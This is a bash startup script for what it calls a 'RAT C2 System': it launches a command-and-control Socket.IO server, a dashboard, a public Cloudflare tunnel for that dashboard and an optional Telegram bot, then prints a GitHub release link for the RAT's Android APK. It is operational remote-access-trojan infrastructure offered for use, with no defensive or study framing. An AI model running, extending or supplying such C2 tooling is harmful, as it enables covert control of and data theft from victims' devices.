#!/bin/bash
# Start all RAT components

set -e

echo "🕷️ Starting RAT C2 System..."

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# Function to check if port is in use
check_port() {
    lsof -i :$1 >/dev/null 2>&1
}

# Kill existing processes
echo -e "${YELLOW}Stopping existing processes...${NC}"
pkill -f "node simple-server.js" 2>/dev/null || true
pkill -f "python.*http.server" 2>/dev/null || true
pkill -f "cloudflared" 2>/dev/null || true
sleep 2

# Start C2 Server
echo -e "${GREEN}Starting C2 Socket.IO Server (port 42474/42475)...${NC}"
cd /workspaces/rat-project
nohup node simple-server.js > /tmp/c2-server.log 2>&1 &
C2_PID=$!
sleep 3

# Check C2 server
if curl -s http://localhost:42475/clients >/dev/null 2>&1; then
    echo -e "${GREEN}✓ C2 Server running on port 42474/42475${NC}"
else
    echo -e "${RED}✗ C2 Server failed to start${NC}"
    cat /tmp/c2-server.log
fi

# Start Dashboard HTTP Server
echo -e "${GREEN}Starting Dashboard (port 8080)...${NC}"
cd /workspaces/rat-project/dashboard
nohup python3 server.py > /tmp/dashboard.log 2>&1 &
DASHBOARD_PID=$!
sleep 2

# Start Cloudflare Tunnel
echo -e "${GREEN}Starting Cloudflare Tunnel...${NC}"
nohup cloudflared tunnel --url http://localhost:8080 > /tmp/cloudflare.log 2>&1 &
CLOUDFLARE_PID=$!
sleep 5

# Get tunnel URL
TUNNEL_URL=$(grep -o 'https://[a-zA-Z0-9-]*\.trycloudflare\.com' /tmp/cloudflare.log | head -1)
if [ -n "$TUNNEL_URL" ]; then
    echo -e "${GREEN}✓ Cloudflare Tunnel: ${TUNNEL_URL}${NC}"
    echo -e "${GREEN}  Dashboard: ${TUNNEL_URL}${NC}"
    echo -e "${GREEN}  API: ${TUNNEL_URL}/clients${NC}"
else
    echo -e "${YELLOW}⚠ Cloudflare tunnel starting... check /tmp/cloudflare.log${NC}"
fi

# Start Telegram Bot (if token is set)
if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ "$TELEGRAM_BOT_TOKEN" != "YOUR_BOT_TOKEN_HERE" ]; then
    echo -e "${GREEN}Starting Telegram Bot...${NC}"
    cd /workspaces/rat-project/bot
    nohup python3 bot.py > /tmp/telegram-bot.log 2>&1 &
    TELEGRAM_PID=$!
    echo -e "${GREEN}✓ Telegram Bot started${NC}"
else
    echo -e "${YELLOW}⚠ Telegram Bot not started (set TELEGRAM_BOT_TOKEN)${NC}"
fi

echo ""
echo -e "${GREEN}✅ All services started!${NC}"
echo ""
echo "📊 Dashboard: ${TUNNEL_URL:-http://localhost:8080}"
echo "🔌 C2 API: ${TUNNEL_URL:-http://localhost:8080}/clients"
echo "🔌 C2 Socket: ${TUNNEL_URL:-http://localhost:42474}"
echo ""
echo "📱 APK Download: https://github.com/confidencebilly38-code/rat-project/releases/tag/v1.0"
echo ""
echo "Press Ctrl+C to stop all services"

# Save PIDs for cleanup
echo $C2_PID > /tmp/rat_c2.pid
echo $DASHBOARD_PID > /tmp/rat_dashboard.pid
echo $CLOUDFLARE_PID > /tmp/rat_cloudflare.pid
[ -n "$TELEGRAM_PID" ] && echo $TELEGRAM_PID > /tmp/rat_telegram.pid

# Wait for interrupt
trap 'echo -e "\n${YELLOW}Stopping all services...${NC}"; kill $C2_PID $DASHBOARD_PID $CLOUDFLARE_PID $TELEGRAM_PID 2>/dev/null; exit 0' INT TERM
wait